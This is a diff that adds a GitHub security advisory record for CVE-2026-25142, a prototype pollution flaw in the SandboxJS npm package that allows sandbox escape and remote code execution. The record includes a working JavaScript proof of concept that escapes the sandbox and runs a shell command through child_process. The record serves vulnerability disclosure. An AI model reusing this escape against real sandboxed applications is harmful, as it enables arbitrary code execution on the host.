@@ -1,0 +1,70 @@
+advisory_id: GHSA-9p4w-fq8m-2hp7
+datasource_id: github_osv_importer_v2/GHSA-9p4w-fq8m-2hp7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9p4w-fq8m-2hp7/GHSA-9p4w-fq8m-2hp7.json
+aliases:
+  - CVE-2026-25142
+summary: |
+  SandboxJS Vulnerable to Prototype Pollution -> Sandbox Escape -> RCE
+  ### Summary
+
+  SandboxJS does not properly restrict `__lookupGetter__` which can be used to obtain prototypes, which can be used for escaping the sandbox / remote code execution.
+
+  ### Details
+
+  https://github.com/nyariv/SandboxJS/blob/f212a38fb5a6d4bc2bc2e2466c0c011ce8d41072/src/executor.ts#L368-L398
+
+  The Object prototype which contains `__lookupGetter__` is properly protected, but the special case for accessing function properties bypasses the prototype chain checks including the root Object prototype.
+
+  ### PoC
+  ```js
+  const s = require("@nyariv/sandboxjs").default;
+  const sb = new s();
+
+  payload = `
+  let getProto = Object.toString.__lookupGetter__("__proto__")
+  let m = getProto.call(new Map());
+  m.has = isFinite;
+
+  console.log(
+    isFinite.constructor(
+      "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
+    )(),
+  );`
+  sb.compile(payload)().run();
+  ```
+
+  ### Impact
+  Prototype Pollution -> RCE
+impacted_packages:
+  - purl: pkg:npm/%40nyariv/sandboxjs
+    affected_versions: vers:npm/<=0.8.26
+    fixed_versions: vers:npm/0.8.27
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9p4w-fq8m-2hp7/GHSA-9p4w-fq8m-2hp7.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/nyariv/SandboxJS
+    reference_type:
+    reference_id:
+  - url: https://github.com/nyariv/SandboxJS/blob/f212a38fb5a6d4bc2bc2e2466c0c011ce8d41072/src/executor.ts#L368-L398
+    reference_type:
+    reference_id:
+  - url: https://github.com/nyariv/SandboxJS/commit/75c8009db32e6829b0ad92ca13bf458178442bd3
+    reference_type:
+    reference_id:
+  - url: https://github.com/nyariv/SandboxJS/security/advisories/GHSA-9p4w-fq8m-2hp7
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25142
+    reference_type:
+    reference_id:
